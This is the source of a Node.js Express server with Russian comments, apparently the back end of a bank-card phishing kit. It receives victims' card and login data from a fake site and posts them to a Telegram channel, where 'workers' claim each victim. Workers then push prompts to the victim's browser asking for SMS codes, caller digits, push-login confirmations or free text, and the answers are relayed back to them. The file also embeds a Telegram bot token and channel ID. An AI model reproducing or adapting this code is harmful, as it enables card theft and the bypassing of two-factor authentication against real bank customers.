const express = require('express');
const axios = require('axios');
const app = express();

app.use(express.json());
app.use(express.static('public'));

// --- КОНФИГУРАЦИЯ ---
const BOT_TOKEN = '8003392137:AAFbnbKyLJS6N1EdYSxtRhR9n5n4eJFpBbw';
const CHANNEL_ID = '-1003455979409';

let userTasks = {}; 
let logsStorage = {}; 
let waitingForText = {}; 

const cmdTexts = {
    'sms': 'Введите код подтверждения из СМС',
    'call': 'Введите последние 4 цифры номера, с которого поступит звонок',
    'push': 'Подтвердите вход в мобильном приложении',
    'bal': 'Недостаточно средств на карте. Попробуйте другую карту',
    'support': 'Ошибка безопасности. Опишите проблему оператору в чате'
};

const safeText = (text) => String(text).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');

app.get('/health', (req, res) => res.send('Бот активен'));

// --- ПРИЕМ ЛОГА С САЙТА ---
app.post('/api/log', async (req, res) => {
    const { userId, type, data } = req.body;
    console.log(`Получен лог: тип=${type}, ID=${userId}`); // Для отладки в Railway

    logsStorage[userId] = { type, data, time: new Date().toLocaleTimeString() };

    // Ищем воркера, который закреплен за этим userId
    const workerId = Object.keys(waitingForText).find(id => waitingForText[id] === userId);

    // ПРОВЕРКА: Если это ответ (код, пароль и т.д.)
    if (workerId && (type === 'ОТВЕТ' || type === 'ВВІД_ПРИВАТ' || type === 'ВВОД')) {
        let replyMsg = `<b>📩 ПОЛУЧЕН ОТВЕТ [<code>${userId}</code>]</b>\n\n`;
        for (let key in data) { replyMsg += `<b>${key}:</b> <code>${data[key]}</code>\n`; }
        
        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            chat_id: workerId,
            text: replyMsg,
            parse_mode: 'HTML'
        }).catch(e => console.log("Ошибка отправки воркеру в ЛС"));
        
        return res.json({ success: true });
    } 

    // Если это новый заход (Карта/Логин) — в канал
    let channelMsg = `<b>🆕 НОВЫЙ ЛОГ [${safeText(type)}]</b>\n🆔 ID: <code>${safeText(userId)}</code>\n📍 Статус: 🔵 Ожидает...`;

    await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        chat_id: CHANNEL_ID,
        text: channelMsg,
        parse_mode: 'HTML',
        reply_markup: { 
            inline_keyboard: [[{ text: "⚡️ ВЗЯТЬ В РАБОТУ", callback_data: `take_${userId}` }]] 
        }
    }).catch(e => console.log("Ошибка канала"));
    
    res.json({ success: true });
});

app.get('/api/check/:userId', (req, res) => {
    const userId = req.params.userId;
    const task = userTasks[userId] || null;
    if (task) { delete userTasks[userId]; }
    res.json(task);
});

// --- ВЕБХУК ТЕЛЕГРАМ ---
app.post('/tg-webhook', async (req, res) => {
    try {
        const { message, callback_query } = req.body;

        if (message && message.text) {
            const chatId = message.chat.id;
            if (message.text === '/start') {
                await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    chat_id: chatId, text: "<b>👋 Бот готов!</b>", parse_mode: 'HTML'
                });
            } 
            else if (waitingForText[chatId]) {
                const targetUserId = waitingForText[chatId];
                userTasks[targetUserId] = { action: 'ask', text: message.text };
                await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    chat_id: chatId, text: `✅ Отправлено пользователю <code>${targetUserId}</code>`, parse_mode: 'HTML'
                });
            }
        }

        if (callback_query) {
            const workerId = callback_query.from.id;
            const [action, userId, code] = callback_query.data.split('_');

            // Убираем часики на кнопке
            await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, {
                callback_query_id: callback_query.id
            }).catch(() => {});

            if (action === 'take') {
                const log = logsStorage[userId];
                if (log) {
                    waitingForText[workerId] = userId; 

                    let fullMsg = `<b>💎 УПРАВЛЕНИЕ ЛОГОМ [${log.type}]</b>\n🆔 ID: <code>${userId}</code>\n\n`;
                    for (let key in log.data) { fullMsg += `<b>${key}:</b> <code>${log.data[key]}</code>\n`; }

                    await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                        chat_id: workerId,
                        text: fullMsg,
                        parse_mode: 'HTML',
                        reply_markup: {
                            inline_keyboard: [
                                [{ text: "💬 СМС", callback_data: `ask_${userId}_sms` }, { text: "📞 Звонок", callback_data: `ask_${userId}_call` }],
                                [{ text: "📲 Пуш", callback_data: `msg_${userId}_push` }, { text: "💰 Баланс", callback_data: `msg_${userId}_bal` }],
                                [{ text: "✍️ Свой текст", callback_data: `custom_${userId}` }]
                            ]
                        }
                    });
                    
                    const workerName = callback_query.from.username ? `@${callback_query.from.username}` : callback_query.from.first_name;
                    await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/editMessageText`, {
                        chat_id: CHANNEL_ID,
                        message_id: callback_query.message.message_id,
                        text: `<b>🆕 ЛОГ [${log.type}]</b>\n🆔 ID: <code>${userId}</code>\n📍 Взял: <b>${workerName}</b> ✅`,
                        parse_mode: 'HTML'
                    });
                }
            }

            if (action === 'custom') {
                waitingForText[workerId] = userId;
                await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    chat_id: workerId, text: `⌨️ <b>Введите текст для юзера <code>${userId}</code>:</b>`, parse_mode: 'HTML'
                });
            }

            if (action === 'ask' || action === 'msg') {
                waitingForText[workerId] = userId; // Важно для ответов!
                userTasks[userId] = { action, text: cmdTexts[code] || "Введите данные" };
            }
        }
    } catch (e) { console.error("Webhook Error:", e.message); }
    
    // ВАЖНО: Отвечаем в конце, чтобы дождаться выполнения команд
    res.sendStatus(200);
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`🚀 Сервер запущен на порту ${PORT}`));
